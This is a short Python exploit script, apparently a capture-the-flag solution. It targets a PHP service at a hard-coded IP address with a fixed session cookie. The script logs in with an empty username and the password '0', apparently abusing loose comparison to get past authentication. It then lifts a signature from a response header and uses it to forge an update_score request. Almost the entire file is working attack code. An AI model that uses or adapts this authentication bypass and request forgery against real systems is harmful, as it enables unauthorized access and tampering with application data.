import requests
from urllib.parse import quote

# URL = "http://localhost"

URL = "http://103.20.235.21"
PHPSESSID = "64844fb4de221741370fb1e3bf92f36a"


class API(object):
    def update_score(username, next_level, signature, url=URL):
        username = quote(username)
        next_level = quote(next_level)
        signature = quote(signature)
        res = requests.get(
            f"{url}:9000/update_score.php?username={username}&next_level={next_level}&signature={signature}")
        return res.status_code

    def register(username, password, signature, url=URL):
        username = quote(username)
        password = quote(password)
        signature = quote(signature)
        res = requests.get(
            f"{url}:9000/register.php?username={username}&password={password}&signature={signature}")
        return res.status_code

class SERVER(object):
    def login(username, password, url=URL):
        res = requests.post(f"{url}:8000/index.php", data={
            "username": username,
            "password": password
        },cookies={"PHPSESSID": PHPSESSID})
        return res.headers

sha1 = SERVER.login('','0')['API'].split('=')[-1]
res = API.update_score("", "0", sha1)

print(res)


